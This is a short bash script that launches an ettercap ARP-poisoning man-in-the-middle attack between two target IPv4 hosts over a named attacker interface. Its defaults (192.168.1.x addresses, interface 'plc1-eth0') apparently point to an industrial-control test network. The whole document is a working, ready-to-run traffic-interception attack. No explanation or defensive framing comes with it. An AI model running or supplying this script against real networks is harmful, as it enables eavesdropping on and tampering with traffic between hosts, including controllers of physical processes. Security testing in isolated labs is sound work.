#!/bin/bash

# $1 first target IPv4
# $2 second target IPv4
# $3 attacker sniffing interface

# ipv6command=ettercap --help|grep -q 'MAC/IP/IPv6/PORT'

ettercap --help |grep -q 'MAC/IP/IPv6/PORT'
ipv6command=$?

if [[ $# -eq 0 ]]; then
    T1=192.168.1.20
    T2=192.168.1.30
    ATT_IFACE=plc1-eth0
    echo "No argument, use default parameters"
    echo "target IP1:" $T1
    echo "target IP2:" $T2
    echo "attacker interface:" $ATT_IFACE
else
    T1=$1
    T2=$2
    ATT_IFACE=$3
fi

if [[ $ipv6command -eq 0 ]]; then
    ettercap -T -M arp:remote /$T1// /$T2// -i $ATT_IFACE &
else
    ettercap -T -M arp:remote /$T1/ /$T2/ -i $ATT_IFACE &
fi
